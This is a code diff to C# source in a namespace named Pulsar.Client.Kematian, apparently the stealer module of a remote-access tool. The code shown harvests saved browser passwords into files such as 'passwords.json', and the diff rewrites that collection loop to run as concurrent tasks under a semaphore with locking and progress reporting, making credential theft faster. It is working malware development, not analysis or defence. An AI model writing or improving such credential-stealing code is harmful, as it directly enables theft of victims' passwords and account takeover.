@@ -83,11 +83,12 @@ namespace Pulsar.Client.Kematian
                                 new KeyValuePair<Func<string>, string>(() => retriever.GetPasswordsForBrowser(browserName), "passwords.json")
                             }
                         }
-                    };
-
+                    };                    
+                    
                     List<Tuple<string, byte[]>> entryResults = new List<Tuple<string, byte[]>>();
 
-                    semaphore = new SemaphoreSlim(Environment.ProcessorCount);
+                    int maxConcurrency = Math.Min(Environment.ProcessorCount * 2, 8);
+                    semaphore = new SemaphoreSlim(maxConcurrency);
                     
                     try
                     {
@@ -107,47 +108,59 @@ namespace Pulsar.Client.Kematian
                         foreach (var methodPair in textMethods)
                         {
                             string path = methodPair.Value;
-                            try
+                            var task = Task.Run(async () =>
                             {
-                                cancellationToken.ThrowIfCancellationRequested();
-                                
-                                string content = methodPair.Key();
-                                if (!string.IsNullOrEmpty(content))
+                                await semaphore.WaitAsync(cancellationToken);
+                                try
                                 {
-                                    byte[] contentBytes = System.Text.Encoding.UTF8.GetBytes(content);
-                                    entryResults.Add(new Tuple<string, byte[]>(path, contentBytes));
-                                }
-
-                                if (!cancellationToken.IsCancellationRequested)
-                                {
-                                    int completed = Interlocked.Increment(ref completedTasks);
-                                    try 
+                                    cancellationToken.ThrowIfCancellationRequested();
+                                    
+                                    string content = methodPair.Key();
+                                    if (!string.IsNullOrEmpty(content))
                                     {
-                                        int percentage = (int)((double)completed / totalTasks * 100);
-                                        progress?.Report(percentage);
+                                        byte[] contentBytes = System.Text.Encoding.UTF8.GetBytes(content);
+                                        lock (entryResults)
+                                        {
+                                            entryResults.Add(new Tuple<string, byte[]>(path, contentBytes));
+                                        }
                                     }
-                                    catch { }
-                                }
-                            }
-                            catch (OperationCanceledException)
-                            {
 
-                            }
-                            catch (Exception ex)
-                            {
-                                Debug.WriteLine($"Error processing {path}: {ex.Message}");
-
-                                if (!cancellationToken.IsCancellationRequested)
-                                {
-                                    try
+                                    if (!cancellationToken.IsCancellationRequested)
                                     {
                                         int completed = Interlocked.Increment(ref completedTasks);
-                                        int percentage = (int)((double)completed / totalTasks * 100);
-                                        progress?.Report(percentage);
+                                        try 
+                                        {
+                                            int percentage = (int)((double)completed / totalTasks * 100);
+                                            progress?.Report(percentage);
+                                        }
+                                        catch { }
                                     }
-                                    catch { }
                                 }
-                            }
+                                catch (OperationCanceledException)
+                                {
+                                }
+                                catch (Exception ex)
+                                {
+                                    Debug.WriteLine($"Error processing {path}: {ex.Message}");
+
+                                    if (!cancellationToken.IsCancellationRequested)
+                                    {
+                                        try
+                                        {
+                                            int completed = Interlocked.Increment(ref completedTasks);
+                                            int percentage = (int)((double)completed / totalTasks * 100);
+                                            progress?.Report(percentage);
+                                        }
+                                        catch { }
+                                    }
+                                }
+                                finally
+                                {
+                                    semaphore.Release();
+                                }
+                            }, cancellationToken);
+                            
+                            allTasks.Add(task);
                         }
 
                         foreach (var browser in sortedBrowserInfo)
